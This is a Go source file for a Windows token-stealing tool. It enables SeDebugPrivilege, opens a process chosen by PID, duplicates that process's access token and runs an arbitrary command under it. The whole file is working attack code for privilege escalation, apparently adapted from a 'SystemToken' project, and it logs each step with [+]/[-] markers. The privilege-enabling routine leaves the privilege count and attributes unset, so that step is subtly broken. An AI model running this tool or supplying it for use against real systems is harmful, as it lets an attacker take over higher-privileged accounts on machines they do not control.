package main

import (
	"flag"
	"log"
	"syscall"
	"unsafe"
)

// References: https://stackoverflow.com/questions/39595252/shutting-down-windows-using-golang-code
type Luid struct {
	lowPart  uint32 // DWORD
	highPart int32  // long
}
type LuidAndAttributes struct {
	luid       Luid   // LUID
	attributes uint32 // DWORD
}

type TokenPrivileges struct {
	privilegeCount uint32 // DWORD
	privileges     [1]LuidAndAttributes
}

var (
	// kernel32DLL = syscall.NewLazyDLL("Kernel32.dll")
	advapi32DLL = syscall.NewLazyDLL("Advapi32.dll")

	// GetCurrentProcess       	= kernel32DLL.NewProc("GetCurrentProcess")       // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
	// OpenProcess             	= kernel32DLL.NewProc("OpenProcess")             // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
	// CreateToolhelp32Snapshot	= kernel32DLL.NewProc("CreateToolhelp32Snapshot")// https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
	// OpenProcessToken        	= advapi32DLL.NewProc("OpenProcessToken")        // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
	LookupPrivilegeValueW   = advapi32DLL.NewProc("LookupPrivilegeValueW")   // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
	AdjustTokenPrivileges   = advapi32DLL.NewProc("AdjustTokenPrivileges")   // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
	ImpersonateLoggedOnUser = advapi32DLL.NewProc("ImpersonateLoggedOnUser") // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
	DuplicateTokenEx        = advapi32DLL.NewProc("DuplicateTokenEx")        // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
	CreateProcessWithTokenW = advapi32DLL.NewProc("CreateProcessWithTokenW") // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw
)

const (
	// [Access Rights for Access-Token Objects](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-for-access-token-objects)
	TOKEN_QUERY             = 0x0008 // Required to query an access token.
	TOKEN_DUPLICATE         = 0x0002 // Required to duplicate an access token.
	TOKEN_ADJUST_PRIVILEGES = 0x0020 // Required to enable or disable the privileges in an access token.
	// [Process Security and Access Rights](https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
	PROCESS_QUERY_INFORMATION         = 0x0400
	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000 // Windows Server 2003 and Windows XP: This access right is not supported.
	// [ACCESS_MASK](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b)
	MAXIMUM_ALLOWED = 0x02000000
	// [SECURITY_IMPERSONATION_LEVEL enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-security_impersonation_level)
	SecurityImpersonation = 2
	// [TOKEN_TYPE enumeration](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_type)
	TokenPrimary = 1
	// [CreateProcessWithTokenW function](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
	LOGON_WITH_PROFILE = 0x00000001
	// [CreateToolhelp32Snapshot function](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
	TH32CS_SNAPPROCESS = 0x00000002
)

func enableSeDebugPrivilege() error {
	var CurrentTokenHandle syscall.Token
	var tkp TokenPrivileges
	// [Privilege Constants (Authorization)](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)
	SE_DEBUG_NAME := syscall.StringToUTF16Ptr("SeDebugPrivilege")

	CurrentProcessHandle, err := syscall.GetCurrentProcess()
	if err != nil {
		log.Println("[-] GetCurrentProcess() error:", err)
	} else {
		log.Println("[+] GetCurrentProcess() success")
	}

	err = syscall.OpenProcessToken(CurrentProcessHandle, TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle)
	if err != nil {
		log.Println("[-] OpenProcessToken() error:", err)
	} else {
		log.Println("[+] OpenProcessToken() success")
	}

	result, _, err := LookupPrivilegeValueW.Call(uintptr(0), uintptr(unsafe.Pointer(SE_DEBUG_NAME)), uintptr(unsafe.Pointer(&(tkp.privileges[0].luid))))
	if result != 1 {
		log.Println("[-] LookupPrivilegeValue() error:", err)
	} else {
		log.Println("[+] LookupPrivilegeValue() success")
	}

	result, _, err = AdjustTokenPrivileges.Call(uintptr(CurrentTokenHandle), 0, uintptr(unsafe.Pointer(&tkp)), 0, uintptr(0), 0)
	if result != 1 {
		log.Println("[-] AdjustTokenPrivileges() error:", err)
	} else {
		log.Println("[+] AdjustTokenPrivileges() success")
	}

	return err
}

// Reference: https://github.com/yusufqk/SystemToken/blob/master/main.c len 102
func handleProcess(pid uint32) syscall.Handle {
	log.Println("[+] OpenProcess() start.")
	ProcessHandle, err := syscall.OpenProcess(PROCESS_QUERY_INFORMATION, true, pid)
	// log.Println(err)
	if err != nil {
		ProcessHandle, err = syscall.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
		if err != nil {
			log.Println("[-] OpenProcess() error:", err)
		}
	} else {
		log.Println("[+] OpenProcess() success:", ProcessHandle)
	}
	return ProcessHandle
}

func runAsToken(TokenHandle uintptr, command *uint16) error {
	var NewTokenHandle syscall.Token
	var StartupInfo syscall.StartupInfo
	var ProcessInformation syscall.ProcessInformation

	result, _, err := DuplicateTokenEx.Call(TokenHandle, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewTokenHandle)))
	if result != 1 {
		log.Println("[-] DuplicateTokenEx() error:", err)
	} else {
		log.Println("[+] DuplicateTokenEx() success")
	}

	result, _, err = CreateProcessWithTokenW.Call(uintptr(NewTokenHandle), LOGON_WITH_PROFILE, uintptr(0), uintptr(unsafe.Pointer(command)), 0, uintptr(0), uintptr(0), uintptr(unsafe.Pointer(&StartupInfo)), uintptr(unsafe.Pointer(&ProcessInformation)))
	if result != 1 {
		log.Println("[-] CreateProcessWithTokenW() error:", err)
	} else {
		log.Println("[+] CreateProcessWithTokenW() success")
	}

	return err
}

func main() {
	var pid int
	var command string
	var TokenHandle syscall.Token

	flag.IntVar(&pid, "p", 0, "Target Process PID.")
	flag.StringVar(&command, "c", "Aquilao", "Execute Command.")
	flag.Parse()

	if pid != 0 && command != "." {
		log.Println("[+] Process Pid: ", pid)
		log.Println("[+] Execute Command: ", command)
		enableSeDebugPrivilege()
		ProcessHandle := handleProcess(uint32(pid))
		err := syscall.OpenProcessToken(ProcessHandle, TOKEN_QUERY|TOKEN_DUPLICATE, &TokenHandle)
		if err != nil {
			log.Println("[-] OpenProcessToken() error:", err)
		} else {
			log.Println("[+] OpenProcessToken() success")
		}
		runAsToken(uintptr(TokenHandle), syscall.StringToUTF16Ptr(command))
	} else {
		log.Println("[-] Please input pid and command, type \"-h\" see help.")
	}
}
